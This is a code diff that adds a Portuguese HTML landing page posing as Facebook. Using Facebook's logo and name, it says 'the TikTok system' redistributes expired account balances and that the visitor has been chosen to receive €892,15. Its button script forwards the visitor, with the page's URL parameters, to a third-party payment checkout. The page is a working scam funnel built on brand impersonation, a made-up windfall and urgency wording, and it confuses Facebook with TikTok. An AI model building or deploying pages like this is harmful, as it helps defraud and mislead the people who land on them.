@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="pt-PT">
+
+<head>
+<script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "wnj6nzjur9");
+</script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redistribuição de Bónus Facebook</title>
+    <link rel="stylesheet" href="/css/upsell-premium.css">
+</head>
+
+<body>
+    <div class="premium-container">
+        <div class="logo-container">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/89/Facebook_Logo_%282019%29.svg/3840px-Facebook_Logo_%282019%29.svg.png" alt="Facebook" class="logo" style="height: 30px;">
+        </div>
+
+        <div class="badge" style="background: #f59e0b; color: #fff;">Oportunidade Única</div>
+
+        <h1 class="title">Receber <span style="color: #f59e0b;">Saldos Expirados</span>?</h1>
+
+        <div class="description">
+            O sistema TikTok redistribui diariamente fundos de contas que foram desativadas por inatividade ou violação de termos.
+        </div>
+
+        <div class="amount-box">
+            <div class="amount-label">VALOR DISPONÍVEL PARA SI</div>
+            <div class="amount-value" style="color: #f59e0b;">€892,15</div>
+        </div>
+
+        <div class="description">
+            Você foi selecionado pelo algoritmo para receber uma fatia desses fundos. Ao ativar agora, este valor é <strong>adicionado imediatamente</strong> ao seu levantamento total.
+        </div>
+
+        <button onclick="redirectToPayment()" class="cta-button pulse" style="background: #f59e0b; box-shadow: 0 10px 20px rgba(245, 158, 11, 0.2);">
+            <span>ADICIONAR €892,15 AO MEU SALDO</span>
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M12 21v-8M9 18l3 3 3-3M12 3v8M15 6l-3-3-3 3"></path></svg>
+        </button>
+
+        <p class="footer-text">
+            © 2026 Facebook Portugal. Fundos limitados por região.
+        </p>
+    </div>
+
+    <script>
+        function getUrlParams() {
+            const params = new URLSearchParams(window.location.search);
+            let paramsObject = {};
+            params.forEach((value, key) => {
+                paramsObject[key] = value;
+            });
+            return paramsObject;
+        }
+
+        function redirectToPayment() {
+            const params = new URLSearchParams(window.location.search);
+            const checkoutUrl = new URL('https://waymb.com/c?username=eduardotreonix&product=8');
+
+            params.forEach((value, key) => {
+                checkoutUrl.searchParams.set(key, value);
+            });
+
+            window.location.href = checkoutUrl.toString();
+        }
+    </script>
+</body>
+
+</html>
